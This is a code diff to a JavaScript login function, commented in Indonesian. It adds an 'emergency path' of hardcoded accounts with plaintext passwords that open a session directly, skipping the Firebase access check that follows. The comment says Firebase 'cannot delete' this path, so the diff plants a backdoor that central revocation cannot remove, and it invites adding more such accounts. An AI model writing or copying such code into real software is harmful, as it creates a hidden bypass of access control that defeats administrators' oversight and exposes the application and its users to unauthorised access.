@@ -610,6 +610,23 @@ function handleAuthLogin(e) {
     }
 
     const lowerUser = user.toLowerCase();
+
+// ===============================================================
+    // 🛡️ JALUR DARURAT SIANG INI (FIREBASE TIDAK BISA MENGHAPUS INI)
+    // ===============================================================
+    const akunDarurat = {
+        "qaz": { pass: "123", rank: "Soldiers" },
+        "budi": { pass: "budi123", rank: "Bisnis" },
+        "member1": { pass: "rahasia", rank: "Associates" }
+        // Silakan tambah akun lain di sini dengan format yang sama
+    };
+
+    if (akunDarurat[lowerUser] && akunDarurat[lowerUser].pass === pass) {
+        if (typeof initSession === 'function') initSession(akunDarurat[lowerUser].rank, user, true);
+        return;
+    }
+
+  
     let finalRank = 'Soldiers';
     let isAllowed = false;
 
